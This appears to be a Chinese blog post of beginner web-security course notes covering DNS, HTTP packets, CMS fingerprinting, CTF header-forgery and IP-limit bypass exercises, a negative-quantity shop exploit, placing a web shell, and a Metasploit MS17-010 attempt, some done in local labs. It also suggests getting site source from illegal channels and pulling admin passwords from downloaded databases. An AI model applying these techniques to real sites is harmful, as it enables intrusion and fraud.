    <content><![CDATA[<h1 id="基础入门"><a href="#基础入门" class="headerlink" title="基础入门"></a>基础入门</h1><h2 id="Day1-基础入门——概念名词"><a href="#Day1-基础入门——概念名词" class="headerlink" title="Day1 基础入门——概念名词"></a>Day1 基础入门——概念名词</h2><h3 id="DNS-概念："><a href="#DNS-概念：" class="headerlink" title="DNS 概念："></a>DNS 概念：</h3><p>域名系统（英文：Domain Name System，缩写：DNS）是互联网的一项服务，使用 UDP 端口53。它作为将域名和 IP 地址相互映射的一个分布式数据库，能够使人更方便地访问互联网。</p>
<p>由于IP地址具有不方便记忆并且不能显示地址组织的名称和性质等缺点，人们设计出了域名，并通过网域名称系统（DNS，Domain Name System）来将域名和 IP 地址相互映射，使人更方便地访问互联网，而不用去记住能够被机器直接读取的 IP 地址数串。 </p>
<p><img src="/2022/08/12/%E3%80%8A%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E3%80%8B%E8%AF%BE%E7%A8%8B%E9%9A%8F%E8%AE%B0/Day1-DNS.png" alt="Day1-DNS"></p>
<ul>
<li>如图，将域名解析为 IP 地址，WWW 可以在阿里云设置，也可以用 <code>*</code> 匹配所有的三级域名</li>
<li>TTL 与 DNS TTL 有区别：二者都是生存时间，前者指 ICMP 数据包的转发次数（跳数）在数据包首部，后者（如图）指域名解析信息在 DNS 中的存在时间。</li>
<li>可以根据 DNS 的 TTL 查询 Web 服务器的操作系统 </li>
</ul>
<p> <strong>域名注册与查询</strong> ：万网(阿里云)</p>
<ol>
<li>如果是自动获取 DNS ，就向上查询，按照路由器，本地域名服务器查询</li>
<li>如果是手动获取，就向设置的 DNS 域名服务器查询</li>
<li>距离越近的域名服务器，上网越快 </li>
</ol>
<h3 id="二级域名和多级域名"><a href="#二级域名和多级域名" class="headerlink" title="二级域名和多级域名"></a>二级域名和多级域名</h3><ul>
<li>国际顶级域名下二级域名， 二级域名一般是指域名注册人选择使用的网上名称，如“yahoo．com”；上网的商业组织通常使用自己的商标、商号或其他商业标志作为自己的网上名称，如“microsoft．com”</li>
<li>国家顶级域名下二级域名，在国家顶级域名之下二级域名一般是指类似于国际顶级域名的表示注册人类别和功能的标志。例如，在“．com．cn”域名结构中，“.com”此时是置于国家顶级域名“.cn”下的二级域名，表示商业性组织</li>
</ul>
<p><strong>域名对安全测试的意义</strong>：</p>
<ol>
<li>相同的二级域名的网站架构、源码、密码可能相似</li>
<li>两个网站的域名解析的 IP 地址可能相同</li>
</ol>
<h3 id="本地-host-文件和-DNS-关系"><a href="#本地-host-文件和-DNS-关系" class="headerlink" title="本地 host 文件和 DNS 关系"></a>本地 host 文件和 DNS 关系</h3><p>Host 文件路径（ DNS 的本地缓存）：<code>C:\Windows\System32\drivers\etc\hosts</code><br>⚠️ 注意 Mac 直接 <code>访达 -&gt; 前往 -&gt; /etc/hosts</code> </p>
<p>作用机制：查找域名解析时，先看本地host文件是否有缓存，没有在查找域名服务器。</p>
<h3 id="CDN-和-DNS-的关系"><a href="#CDN-和-DNS-的关系" class="headerlink" title="CDN 和 DNS 的关系"></a>CDN 和 DNS 的关系</h3><p>CDN 的全称是 Content Delivery Network，即内容分发网络，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。<br>大型网络在不同地区有不同的服务器（节点技术）。 </p>
<p><img src="/2022/08/12/%E3%80%8A%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E3%80%8B%E8%AF%BE%E7%A8%8B%E9%9A%8F%E8%AE%B0/Day1-CDN.png" alt="CDN and DNS"></p>
<h3 id="常见的-DNS-攻击"><a href="#常见的-DNS-攻击" class="headerlink" title="常见的 DNS 攻击"></a>常见的 DNS 攻击</h3><p>DNS 劫持：攻击服务器（地区），IP 解析不正常，跳转到钓鱼网站</p>
<h3 id="常见的脚本语言"><a href="#常见的脚本语言" class="headerlink" title="常见的脚本语言"></a>常见的脚本语言</h3><ul>
<li>PHP  小众型网站开发</li>
<li>java-mvc   大型网站开发</li>
<li>python-django.flask  </li>
<li>asp,aspx,jsp 等等</li>
</ul>
<h3 id="后门（网站，服务器）"><a href="#后门（网站，服务器）" class="headerlink" title="后门（网站，服务器）"></a>后门（网站，服务器）</h3><ul>
<li>下次更容易进入</li>
<li>管道，提供攻击的路径</li>
</ul>
<h3 id="Web-组成架构模型"><a href="#Web-组成架构模型" class="headerlink" title="Web 组成架构模型"></a>Web 组成架构模型</h3><ol>
<li>网站源码：分脚本类型，分应用方向覆盖</li>
<li>操作系统：windows，linux</li>
<li>中间件（搭建平台）：apache,lis,tomcat,nginx</li>
<li>数据库：mysql,access,mssql,oracle,Sybase,db2,postsql等等</li>
</ol>
<h3 id="Web相关的漏洞"><a href="#Web相关的漏洞" class="headerlink" title="Web相关的漏洞"></a>Web相关的漏洞</h3><ul>
<li>web 源码漏洞</li>
<li>web 中间件漏洞</li>
<li>web 数据库漏洞</li>
<li>web 操作系统层对应漏洞</li>
<li>其它第三方对应漏洞 — qq, WPS （EXE 后门功能及危害类似 WEB 后门 ）</li>
<li>App 或者 PC 应用结合漏洞  （App 类结合 WEB 协议，PC 类结合 WEB 协议）</li>
</ul>
<h3 id="多级域名的枚举查找方法"><a href="#多级域名的枚举查找方法" class="headerlink" title="多级域名的枚举查找方法"></a>多级域名的枚举查找方法</h3><ol>
<li>网站搜索 </li>
<li>Layer 工具爆破</li>
<li>运营商的第三方接口</li>
</ol>
<h3 id="域名查询-A-记录"><a href="#域名查询-A-记录" class="headerlink" title="域名查询 A 记录"></a>域名查询 A 记录</h3><ul>
<li>在提示符下直接输入域名，可查到该域名的 A 记录，其中 <code>“Non-authoritative answer”</code>表示查询结果是从 DNS 的 cache 里返回的；</li>
<li>输入 <code>set type=mx</code> ，再输入域名，可查询 MX 记录；</li>
<li>输入 <code>set type=cname</code> ，再输入域名，可查询 CNAME 记录；</li>
<li>输入 <code>set type=ns</code> ，再输入域名，可查询 NS 记录。 </li>
</ul>
<h2 id="Day2-基础入门——数据包拓展"><a href="#Day2-基础入门——数据包拓展" class="headerlink" title="Day2 基础入门——数据包拓展"></a>Day2 基础入门——数据包拓展</h2><p><img src="/2022/08/12/%E3%80%8A%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E3%80%8B%E8%AF%BE%E7%A8%8B%E9%9A%8F%E8%AE%B0/Day2.png" alt="HTTP and Response"></p>
<h3 id="HTTP-S-数据包"><a href="#HTTP-S-数据包" class="headerlink" title="HTTP/S 数据包"></a>HTTP/S 数据包</h3><h4 id="Request请求数据包"><a href="#Request请求数据包" class="headerlink" title="Request请求数据包"></a>Request请求数据包</h4><p><strong>Request</strong> 对象用于接收客户端浏览器提交的数据，有五个集合：</p>
<ul>
<li>QueryString：用以获取客户端附在 url 地址后的查询字符串中的信息。</li>
<li>Form：用以获取客户端在 FORM 表单中所输入的信息。（表单的 method 属性值需要为 POST）</li>
<li>Cookies：用以获取客户端的 Cookie 信息。</li>
<li>ServerVariables：用以获取客户端发出的 HTTP 请求信息中的头信息及服务器端环境变量信息。</li>
<li>ClientCertificate：用以获取客户端的身份验证信息</li>
</ul>
<h4 id="Response返回数据包"><a href="#Response返回数据包" class="headerlink" title="Response返回数据包"></a>Response返回数据包</h4><p><strong>Response</strong> 对象用于动态响应客户端请示，控制发送给用户的信息，并将动态生成响应。Response 对象提供了一个数据集合 cookie，它用于在客户端写入 cookie 值。<br><img src="/2022/08/12/%E3%80%8A%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E3%80%8B%E8%AF%BE%E7%A8%8B%E9%9A%8F%E8%AE%B0/Day2-cookie.png"></p>
<p>Response 的方法:</p>
<ul>
<li>Write：向客户端发送浏览器能够处理的各种数据，包括:html 代码，脚本程序等。</li>
<li>Redirect：response.redirect(“url”) 的作用是在服务器端重定向于另一个网页。</li>
<li>End：用来终止脚本程序。</li>
<li>Clear：要说到 Clear 方法，就必须提到 response 的 Buffer 属性，Buffer 属性用来设置服务器端是否将页面先输出到缓冲区。</li>
<li>Flush：当 Buffer 的值为 True 时，Flush 方法用于将缓冲区中的当前页面内容立刻输出到客户端。</li>
</ul>
<h4 id="proxy代理服务器（burpsuite类似代理服务器）"><a href="#proxy代理服务器（burpsuite类似代理服务器）" class="headerlink" title="proxy代理服务器（burpsuite类似代理服务器）"></a>proxy代理服务器（burpsuite类似代理服务器）</h4><p>代理服务器（万维网高速缓存），和代理服务器建立连接：</p>
<ul>
<li>若存放，直接返回 HTML；</li>
<li>若没有，就代为发出请求并存储返回报文</li>
</ul>
<h4 id="HTTP的简要通信过程"><a href="#HTTP的简要通信过程" class="headerlink" title="HTTP的简要通信过程"></a>HTTP的简要通信过程</h4><p>建立连接（tcp）—发送请求数据包（套接字）—返回响应数据包—关闭连接<br><img src="/%E3%80%8A%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E3%80%8B%E8%AF%BE%E7%A8%8B%E9%9A%8F%E8%AE%B0/Day2-http.png"></p>
<p>同理，https是HTTP的基础上增加了密钥和证书 </p>
<p><img src="/%E3%80%8A%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E3%80%8B%E8%AF%BE%E7%A8%8B%E9%9A%8F%E8%AE%B0/Day2-https.png"></p>
<h3 id="数据包格式"><a href="#数据包格式" class="headerlink" title="数据包格式"></a>数据包格式</h3><h4 id="Request请求数据包-1"><a href="#Request请求数据包-1" class="headerlink" title="Request请求数据包"></a>Request请求数据包</h4><ol>
<li>请求行：请求类型/请求资源路径、协议的版本和类型</li>
<li>请求头：一些键值对，浏览器与 web 服务器之间都可以发送，特定的某种含义</li>
<li>空行：请求头与请求体之间用一个空行隔开；</li>
<li>请求体：要发送的数据(一般 post 提交会使用)<br><img src="/2022/08/12/%E3%80%8A%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E3%80%8B%E8%AF%BE%E7%A8%8B%E9%9A%8F%E8%AE%B0/Day2-request.png"></li>
</ol>
<p><strong>HTTP 规划定义了 8 种可能的请求方法</strong>：</p>
<ul>
<li>GET：检索 URL 中标识资源的一个简单请求</li>
<li>HEAD：与 GET 方法相同，服务器只返回状态行和头标，并不返回请求文档</li>
<li>POST：服务器接受被写入客户端输出流中的数据的请求</li>
<li>PUT：服务器保存请求数据作为指定 URL 新内容的请求</li>
<li>DELETE：服务器删除 URL 中命令的资源的请求</li>
<li>OPTIONS：关于服务器支持的请求方法信息的请求</li>
<li>TRACE：web 服务器反馈 Http 请求和其头标的请求</li>
<li>CONNECT ：已文档化，但当前未实现的一个方法，预留做隧道处理</li>
</ul>
<h4 id="Response返回数据包-1"><a href="#Response返回数据包-1" class="headerlink" title="Response返回数据包"></a>Response返回数据包</h4><ol>
<li>状态行：协议版本、数字形式的状态代码和状态描述，个元素之间以空格分隔</li>
<li>响应头标：包含服务器类型、日期、长度、内容类型等</li>
<li>空行：响应头与响应体之间用空行隔开</li>
<li>响应数据：浏览器会将实体内容中的数据取出来，生成相应的页面<br><img src="/2022/08/12/%E3%80%8A%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E3%80%8B%E8%AF%BE%E7%A8%8B%E9%9A%8F%E8%AE%B0/Day2-response.png"></li>
</ol>
<p><strong>HTTP 响应码</strong>：</p>
<ul>
<li>1xx：信息，请求收到，继续处理</li>
<li>2xx：成功，行为被成功地接受、理解和采纳—200存在文件</li>
<li>3xx：重定向，为了完成请求，必须进一步执行的动作—302可能存在</li>
<li>4xx：客户端错误—403存在文件夹，404不存在文件及文件夹</li>
<li>5xx：服务器错误—500均可能存在 </li>
</ul>
<h3 id="CTF-部分考题解析"><a href="#CTF-部分考题解析" class="headerlink" title="CTF 部分考题解析"></a>CTF 部分考题解析</h3><p>均取自 <a href="https://www.mozhe.cn/">墨者学院</a></p>
<h4 id="来源页伪造"><a href="#来源页伪造" class="headerlink" title="来源页伪造"></a>来源页伪造</h4><p>Burpsuite 抓取数据包，修改数据包中的 <code>Referer</code> 设置为 <code>Google.com</code> ，伪造来自谷歌的访问</p>
<h4 id="浏览器信息伪造"><a href="#浏览器信息伪造" class="headerlink" title="浏览器信息伪造"></a>浏览器信息伪造</h4><p>Burpsuite 抓取数据包修改数据包的 <code>user-agent</code> ，改为 iPhone 手机的 2G 网络设置（具体表达百度可得）</p>
<h4 id="HTTP-动作练习"><a href="#HTTP-动作练习" class="headerlink" title="HTTP 动作练习"></a>HTTP 动作练习</h4><p><strong>原理分析</strong>：URL 过长，向浏览器传输数据不应该使用 get 方法，而是使用 post</p>
<p>Request 请求包由四个部分组成：1.请求行2.请求头3.空行4.请求体</p>
<p>而Post 传输的数据在最后面，最常使用 <code>Content-Type</code> 和 <code>Content-Length</code> 头标</p>
<p>Burpsuite 抓包修改数据包 — 变更请求方式（从 GET 改为 POST ）</p>
<h4 id="投票系统程序设计缺陷分析"><a href="#投票系统程序设计缺陷分析" class="headerlink" title="投票系统程序设计缺陷分析"></a>投票系统程序设计缺陷分析</h4><p><strong>原理分析</strong>：限制了每个ip只能投票一次</p>
<p>方法一：使用代理服务器，用工具改变数据包的 origin 的 IP 地址，循环发送数据包，Burpsuite 抓包后发到 Intruder ，对请求头内 IP 地址采用循环爆破发送数据包</p>
<p>方法二：采用开发程序员 PHP IP地址检验的绕过— HTTP_X_FORWARDED_FOR </p>
<h2 id="Day3-基础入门——搭建安全拓展"><a href="#Day3-基础入门——搭建安全拓展" class="headerlink" title="Day3 基础入门——搭建安全拓展"></a>Day3 基础入门——搭建安全拓展</h2><p>首先需要搭建如 IIS 或 phpstudy 类似 中间件</p>
<h3 id="域名-IP-目录解析安全问题"><a href="#域名-IP-目录解析安全问题" class="headerlink" title="域名 IP 目录解析安全问题"></a>域名 IP 目录解析安全问题</h3><ol>
<li>分析网站的目录结构  一般解压网站源码压缩包后，将文件夹放到 IIS 中间件 wwwroot 处，或 phpstudy 中间件 www 下</li>
<li>直接用 IP 访问 为网站的上一级目录，此处可以在网站文件下新建 <code>1.txt</code> ，然后通过浏览器：<code>IP 地址/1.txt</code> 访问验证 </li>
<li>直接用域名访问 为网站首页（好像需要真实的网站才能实现）</li>
</ol>
<p><strong>原理分析</strong>：<br>用 IP 地址扫描为网站的上一级文件夹，而用域名为网站，是因为很多套模板的网站在上一级有源码备份，因此可以通过 IP 地址获取源码来进行漏洞挖掘 </p>
<h3 id="常见文件后缀解析对应安全"><a href="#常见文件后缀解析对应安全" class="headerlink" title="常见文件后缀解析对应安全"></a>常见文件后缀解析对应安全</h3><ol>
<li>更改应用程序映射<ul>
<li>复制*.asp的文件物理路径</li>
<li>新建*.xiaodi8的应用程序，物理路径为*.asp的文件物理路径</li>
</ul>
</li>
<li>在网站源码新建文件<br> 新建x.diaodi8的文件，内容为菜刀的asp文件的漏洞，密码为x</li>
<li>用菜刀连接<ul>
<li>本机访问utl/x.xiaodi8（这一步我没有成功，浏览器404.0，文件不存在，下面就没有办法操作了）</li>
<li>复制URL</li>
<li>放入菜刀中连接—可以查看服务器的文件</li>
</ul>
</li>
</ol>
<h3 id="常见安全测试中的安全防护"><a href="#常见安全测试中的安全防护" class="headerlink" title="常见安全测试中的安全防护"></a>常见安全测试中的安全防护</h3><ol>
<li>用户组的安全权限—读写等</li>
<li>Ip地址和域名的访问限制</li>
<li>Ssl的连接的证书的设置</li>
</ol>
<h3 id="WEB-后门与用户及文件权限"><a href="#WEB-后门与用户及文件权限" class="headerlink" title="WEB 后门与用户及文件权限"></a>WEB 后门与用户及文件权限</h3><p>访问的设置，如允许匿名访问还是其他</p>
<ul>
<li>如果关闭匿名访问，网站无法访问</li>
<li>匿名访问的用户组为—iis的宾客用户</li>
<li>可以在安全权限设置iis的宾客用户的权限，如拒绝读写，用户就无法访问，也就无法利用文件漏洞 </li>
</ul>
<h3 id="The-Vulhub-靶场"><a href="#The-Vulhub-靶场" class="headerlink" title="The Vulhub 靶场"></a>The Vulhub 靶场</h3><p><a href="https://vulhub.org/">Vulhub</a> 是一个基于 <code>docker</code> 和 <code>docker-compose</code> 的漏洞环境集合，进入对应目录并执行一条语句即可启动一个全新的漏洞环境，让漏洞复现变得更加简单，让安全研究者更加专注于漏洞原理本身。</p>
<p>安装步骤：</p>
<ol>
<li>安装 docker 和 docker-compose</li>
<li>Github 下载 Vulhub 源文件</li>
<li>解压并进入目录（选中一个要启动的漏洞目录）</li>
<li>执行命令 <code>docker-compose up -d</code> 启动漏洞环境</li>
<li>可参照靶场漏洞环境文档进行复现</li>
<li>最后记得 <code>docker-compose down</code> 关闭漏洞环境</li>
</ol>
<h2 id="Day4-基础入门——Web源码拓展"><a href="#Day4-基础入门——Web源码拓展" class="headerlink" title="Day4 基础入门——Web源码拓展"></a>Day4 基础入门——Web源码拓展</h2><h3 id="关于-Web-源码目录结构"><a href="#关于-Web-源码目录结构" class="headerlink" title="关于 Web 源码目录结构"></a>关于 Web 源码目录结构</h3><p><img src="/2022/08/12/%E3%80%8A%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E3%80%8B%E8%AF%BE%E7%A8%8B%E9%9A%8F%E8%AE%B0/Day4-%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84.png" alt="源码的目录结构"></p>
<p>从以上图片中可得到以下信息：</p>
<ul>
<li>网站的脚本类型—asp脚本—从index.asp判断出</li>
<li>网站的管理后台—admin目录</li>
<li>网站的数据—data目录—包含数据库配置文件<br>  asp 脚本的数据库为 <code>.mdb</code> 文件；<br>  打开数据库文件表格可查看管理员账号等存储的信息；<br>  最主要是数据库配置文件—config.脚本类型</li>
<li>模板文件—template文件—网站的架构 </li>
</ul>
<h3 id="关于-Web-源码脚本类型"><a href="#关于-Web-源码脚本类型" class="headerlink" title="关于 Web 源码脚本类型"></a>关于 Web 源码脚本类型</h3><p>ASP,PHP,ASPX,JSP,JAVAWEB 等脚本类型源码安全问题：<br><a href="https://websec.readthedocs.io/zh/latest/language/index.html">https://websec.readthedocs.io/zh/latest/language/index.html</a></p>
<h3 id="关于-Web-源码应用分类"><a href="#关于-Web-源码应用分类" class="headerlink" title="关于 Web 源码应用分类"></a>关于 Web 源码应用分类</h3><ol>
<li>框架开发—直接找脚本语言框架的漏洞</li>
<li>非框架开发—-找代码的漏洞</li>
<li>CMS 识别（网上开源代码）—如何判断是用什么程序搭建的—网上公开漏洞<ul>
<li>开源—能识别并且在网上下载（白盒）</li>
<li>内部—没有源码或不知道—常规的渗透测试（黑盒）</li>
<li>源码获取—扫描工具扫描备份文件—cms获取源码—特定渠道（非法网站源码）</li>
</ul>
</li>
<li>社交，论坛，门户，第三方，博客等不同的代码机制对应漏洞</li>
<li>关于源码获取的相关途径：搜索，咸鱼淘宝，第三方源码站—菜鸟源码，各种行业对应—源码之家，站长下载</li>
</ol>
<p><strong>总结</strong><br>关注应用分类及脚本类型估摸出可能存在的漏洞（其中框架类例外），在获取源码后可进行本地安全测试（自己搭建扫描）或代码审计，也可以分析其目录工作原理（数据库备份，bak 文件等），未获取到的源码采用各种方法想办法获取！ </p>
<h3 id="关于-Web-源码测试分析"><a href="#关于-Web-源码测试分析" class="headerlink" title="关于 Web 源码测试分析"></a>关于 Web 源码测试分析</h3><h4 id="ASP-PHP-等源码下安全测试"><a href="#ASP-PHP-等源码下安全测试" class="headerlink" title="ASP,PHP 等源码下安全测试"></a>ASP,PHP 等源码下安全测试</h4><ul>
<li>平台识别——某 CMS 无漏洞——默认数据库</li>
<li>平台识别——某 CMS 有漏洞——漏洞利用</li>
</ul>
<p><strong>CMS 人工识别</strong>大概流程如下：</p>
<ol>
<li>查看网站底部栏信息</li>
<li>进行信息识别（百度搜索CMS类型源码）</li>
<li>通过源码查看数据库位置</li>
<li>网站访问路径下载数据库</li>
<li>通过数据库获取管理员账户密码（解密password）</li>
<li>进入管理员登录界面，然后根据CMS类型查找漏洞，根据漏洞进行渗透测试</li>
</ol>
<p><strong>CMS 工具识别</strong>流程：（不推荐）</p>
<ol>
<li>访问网站</li>
<li>下载logo文件并且查看MD5—-一般为网站的ico文件（favico.ico）</li>
<li>windows 执行命令 <code>certutil -hashfile filename MD5</code></li>
<li>将MD5 的值复制粘贴在CMS指纹识别库中匹配 <ul>
<li>如果匹配，就是CMS的模板—-搜集的网站的文件路径</li>
<li>获取网站的文件的数据库中管理员的密码 </li>
</ul>
</li>
</ol>
<p><strong>网上 CMS 识别的平台</strong>：</p>
<p><a href="http://whatweb.bugscaner.com/">http://whatweb.bugscaner.com/</a></p>
<p><a href="https://www.yunsee.cn/">https://www.yunsee.cn/</a></p>
<h4 id="源码应用分类下的针对漏洞"><a href="#源码应用分类下的针对漏洞" class="headerlink" title="源码应用分类下的针对漏洞"></a>源码应用分类下的针对漏洞</h4><blockquote>
<p>【举例】niushop 电商类关注漏洞点-业务逻辑</p>
</blockquote>
<ol>
<li>进入搭建好的网站</li>
</ol>
<p><img src="/2022/08/12/%E3%80%8A%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E3%80%8B%E8%AF%BE%E7%A8%8B%E9%9A%8F%E8%AE%B0/Day4-1.webp"></p>
<ol start="2">
<li>点击立即购买，Burpsuite抓包分析， <code>num</code> 为商品数量</li>
</ol>
<p><img src="/2022/08/12/%E3%80%8A%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E3%80%8B%E8%AF%BE%E7%A8%8B%E9%9A%8F%E8%AE%B0/Day4-2.webp"></p>
<ol start="3">
<li>提交订单，发送成功提示支付 ¥10000 元</li>
</ol>
<p><img src="/2022/08/12/%E3%80%8A%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E3%80%8B%E8%AF%BE%E7%A8%8B%E9%9A%8F%E8%AE%B0/Day4-3.webp"></p>
<ol start="4">
<li>重新购买一个商品， Burpsuite抓包将 <code>num</code> 改为 <code>-1</code></li>
</ol>
<p><img src="/2022/08/12/%E3%80%8A%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E3%80%8B%E8%AF%BE%E7%A8%8B%E9%9A%8F%E8%AE%B0/Day4-4.webp"></p>
<ol start="5">
<li>返回数据包发现支付界面 ¥-999元，也就是 0 元</li>
</ol>
<p><img src="/2022/08/12/%E3%80%8A%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E3%80%8B%E8%AF%BE%E7%A8%8B%E9%9A%8F%E8%AE%B0/Day4-5.webp"></p>
<p><strong>总结</strong>：对于此类网站，功能越多，漏洞越多</p>
<h4 id="简要目标从识别到源码获取"><a href="#简要目标从识别到源码获取" class="headerlink" title="简要目标从识别到源码获取"></a>简要目标从识别到源码获取</h4><ul>
<li>手工发现其CMS——漏洞搜索或下载分析</li>
<li>人工爆框架——搜索框架漏洞/搜索特定url以获取其他相符站点——漏洞测试</li>
<li>借助特定行业源码或咸鱼进行搜索获取-本地搭建-代码审计或其他</li>
</ul>
<h4 id="总结思路"><a href="#总结思路" class="headerlink" title="总结思路"></a>总结思路</h4><ol>
<li>先登录网站的文件路径—报错查看是否为框架—工具查找漏洞</li>
<li>不是框架就CMS识别<ul>
<li>人工识别—底部的如：ZHCMS,ASPCMS等搜索，获得网站源码，以及文件的路径；网站的部分目录；网站的响应包的特殊路径</li>
<li>工具识别—点击logo一般为网站的ico图片，通过查看MD5，匹配自己的ICM识别库，获取文件的路径</li>
<li>平台识别—通过查找域名，获取信息</li>
</ul>
</li>
<li>源码的获取<ul>
<li>站长之家</li>
<li>咸鱼淘宝  </li>
</ul>
</li>
</ol>
<h2 id="Day5-基础入门——系统及数据库等"><a href="#Day5-基础入门——系统及数据库等" class="headerlink" title="Day5 基础入门——系统及数据库等"></a>Day5 基础入门——系统及数据库等</h2><h3 id="操作系统层面"><a href="#操作系统层面" class="headerlink" title="操作系统层面"></a>操作系统层面</h3><h4 id="识别操作系统的方法"><a href="#识别操作系统的方法" class="headerlink" title="识别操作系统的方法"></a>识别操作系统的方法</h4><ol>
<li>网站URL<ul>
<li>Windows不区分大小写</li>
<li>Linux区分大小写</li>
</ul>
</li>
<li>TTL值 不同的操作系统的默认TTL值是不同的， 所以我们可以通过TTL值来判断主机的操作系统，但是当用户修改了TTL值的时候，就会误导我们的判断，所以这种判断方式也不一定准确。下面是默认操作系统的TTL：<ul>
<li>WINDOWS NT/2000   TTL：128</li>
<li>WINDOWS 95/98     TTL：32</li>
<li>UNIX              TTL：255</li>
<li>LINUX             TTL：64</li>
<li>WIN7              TTL：64 </li>
</ul>
</li>
<li>Nmap扫描</li>
</ol>
<h4 id="不同os的区别"><a href="#不同os的区别" class="headerlink" title="不同os的区别"></a>不同os的区别</h4><ul>
<li>操作，命令，界面，大小写，文件类型，编码方式等等</li>
<li>最主要：文件路径的问题，windows磁盘分区，Linux根结点</li>
</ul>
<h4 id="操作系统层面漏洞类型对应的意义与影响范围"><a href="#操作系统层面漏洞类型对应的意义与影响范围" class="headerlink" title="操作系统层面漏洞类型对应的意义与影响范围"></a>操作系统层面漏洞类型对应的意义与影响范围</h4><ul>
<li>dos攻击，缓冲区溢出，提权等等</li>
</ul>
<blockquote>
<p>【举例】MS10710永恒之蓝漏洞</p>
</blockquote>
<ol>
<li>使用search命令来寻找一下ms17_010模块 </li>
</ol>
<p><img src="/2022/08/12/%E3%80%8A%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E3%80%8B%E8%AF%BE%E7%A8%8B%E9%9A%8F%E8%AE%B0/Day5-1.webp"></p>
<ol start="2">
<li>需要配置目标地址和payload以及本地地址</li>
</ol>
<p><img src="/2022/08/12/%E3%80%8A%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E3%80%8B%E8%AF%BE%E7%A8%8B%E9%9A%8F%E8%AE%B0/Day5-2.webp"></p>
<ol start="3">
<li>需要配置目标地址和payload以及本地地址，使用exploit的命令执行—-主机没有这个MS10710漏洞</li>
</ol>
<p><img src="/2022/08/12/%E3%80%8A%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E3%80%8B%E8%AF%BE%E7%A8%8B%E9%9A%8F%E8%AE%B0/Day5-3.webp"></p>
<p><strong>总结</strong>: 通过漏洞获取权限，进行提权 </p>
<h3 id="数据库层面"><a href="#数据库层面" class="headerlink" title="数据库层面"></a>数据库层面</h3><h4 id="数据库类型识别"><a href="#数据库类型识别" class="headerlink" title="数据库类型识别"></a>数据库类型识别</h4><ol>
<li>通过脚本识别</li>
</ol>
<table>
<thead>
<tr>
<th>脚本类型</th>
<th>数据库类型</th>
</tr>
</thead>
<tbody><tr>
<td>asp</td>
<td>access</td>
</tr>
<tr>
<td>php</td>
<td>mysql</td>
</tr>
<tr>
<td>aspx</td>
<td>mssql</td>
</tr>
<tr>
<td>jsp</td>
<td>mssql、oracle</td>
</tr>
<tr>
<td>python</td>
<td>mogodb</td>
</tr>
</tbody></table>
<ol start="2">
<li>通过操作系统识别</li>
</ol>
<p>Windows下才有—access，sqlserver</p>
<ol start="3">
<li>利用端口扫描—-数据库会有对应的端口号</li>
</ol>
<ul>
<li>Oracle 默认是1521</li>
<li>SQL Server 默认是1433</li>
<li>MySQL 默认是3306</li>
<li>pointbase 默认是9092</li>
<li>DB2 默认是5000 </li>
<li>MongoDB 默认是27017</li>
<li>Redis 默认是6379</li>
<li>memcached 默认是11211  </li>
</ul>
<h4 id="数据库类型区别以及识别意义"><a href="#数据库类型区别以及识别意义" class="headerlink" title="数据库类型区别以及识别意义"></a>数据库类型区别以及识别意义</h4><ul>
<li>数据库的类型，漏洞和结构不同</li>
<li>获取用户的账号密码，登录网站 </li>
</ul>
<h3 id="第三方层面"><a href="#第三方层面" class="headerlink" title="第三方层面"></a>第三方层面</h3><p>如何判断有哪些第三方平台和软件如vsftp:</p>
<pre><code>通过nmap -O -sV ip地址扫描----Apache和PHP和MySQL版本 
</code></pre>
<h3 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h3><h4 id="关于msfconsole"><a href="#关于msfconsole" class="headerlink" title="关于msfconsole"></a>关于msfconsole</h4><p>msfconsole 简称 msf ，是 <code>metasploit</code> 中的一款常用的渗透测试工具，集成了很多漏洞的利用的脚本，包含了常见的漏洞利用模块和生成各种木马，使用起来非常简单。<br>进入 <code>msfconsole---use exploit/multi/handler</code> 寻找漏洞 …</p>
<h4 id="使用教程"><a href="#使用教程" class="headerlink" title="使用教程"></a>使用教程</h4><p>在 Kali 终端中输入 msfconsole 命令即可进入 msf 的控制台，msf 控制台集成了很多其他程序接口，例如 nmap、sqlmap 可以在 msf 控制台中使用。<br><img src="/2022/08/12/%E3%80%8A%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E3%80%8B%E8%AF%BE%E7%A8%8B%E9%9A%8F%E8%AE%B0/Day5-msf1.png"><br><img src="/2022/08/12/%E3%80%8A%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E3%80%8B%E8%AF%BE%E7%A8%8B%E9%9A%8F%E8%AE%B0/Day5-msf2.png"><br>可以看到每个分类中的模块数量：</p>
<ul>
<li>exploit 渗透攻击模块，漏洞利用exp脚本</li>
<li>auxiliary 辅助模块，信息收集以实现辅助攻击，如端口扫描工具、口令猜测破解、敏感信息嗅探等</li>
<li>post 后渗透攻击模块</li>
<li>encoders 编码器模块，对指令重新进行编码，用以实现反检测功能、指令顺利执行等</li>
<li>payloads 攻击载荷模块，由一些可动态运行在远程主机上的代码组成</li>
<li>nops 空指令模块，用以产生缓冲区填充的非操作性指令</li>
</ul>
<p>一些基础指令如下：</p>
